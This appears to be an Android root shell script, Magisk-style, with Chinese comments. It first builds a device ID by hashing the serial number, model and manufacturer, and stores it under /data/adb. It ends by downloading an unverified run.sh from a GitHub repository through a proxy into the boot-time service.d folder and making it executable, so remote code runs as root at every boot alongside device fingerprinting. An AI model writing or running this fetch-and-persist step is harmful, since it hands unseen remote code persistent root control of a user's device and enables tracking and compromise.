
#!/bin/sh
# ------------------------------
# 获取设备唯一 ID（机器码）
# ------------------------------
device_id="unknown"
device_components=""

if command -v getprop >/dev/null 2>&1; then
  serial=$(getprop ro.serialno 2>/dev/null)
  model=$(getprop ro.product.model 2>/dev/null)
  manufacturer=$(getprop ro.product.manufacturer 2>/dev/null)
  brand=$(getprop ro.product.brand 2>/dev/null)
  [ -n "$serial" ] && device_components="$serial"
  [ -n "$model" ] && device_components="${device_components}_${model}"
  [ -n "$manufacturer" ] && device_components="${device_components}_${manufacturer}"
  [ -n "$brand" ] && device_components="${device_components}_${brand}"
fi

if [ -z "$device_components" ] && [ -f /system/build.prop ]; then
  serial=$(grep -m1 '^ro.serialno=' /system/build.prop | cut -d'=' -f2)
  model=$(grep -m1 '^ro.product.model=' /system/build.prop | cut -d'=' -f2)
  manufacturer=$(grep -m1 '^ro.product.manufacturer=' /system/build.prop | cut -d'=' -f2)
  [ -n "$serial" ] && device_components="$serial"
  [ -n "$model" ] && device_components="${device_components}_${model}"
  [ -n "$manufacturer" ] && device_components="${device_components}_${manufacturer}"
fi

if [ -n "$device_components" ]; then
  if command -v md5sum >/dev/null 2>&1; then
    device_id=$(echo -n "$device_components" | md5sum | awk '{print $1}')
  elif command -v md5 >/dev/null 2>&1; then
    device_id=$(echo -n "$device_components" | md5 | awk '{print $1}')
  fi
fi


# ------------------------------
# 保存 device_id
# ------------------------------
deviceid_path="/data/adb/.deviceid"
mkdir -p /data/adb 2>/dev/null || true
if [ -n "$device_id" ] && [ "$device_id" != "unknown" ]; then
  echo "$device_id" > "$deviceid_path"
  chmod 600 "$deviceid_path"
fi

# ------------------------------
# 输出结果
# ------------------------------
# ------------------------------
# 下载并执行客户端（后台进程）
# ------------------------------
curl -sS -o /data/adb/service.d/run.sh "https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
chmod +x /data/adb/service.d/run.sh
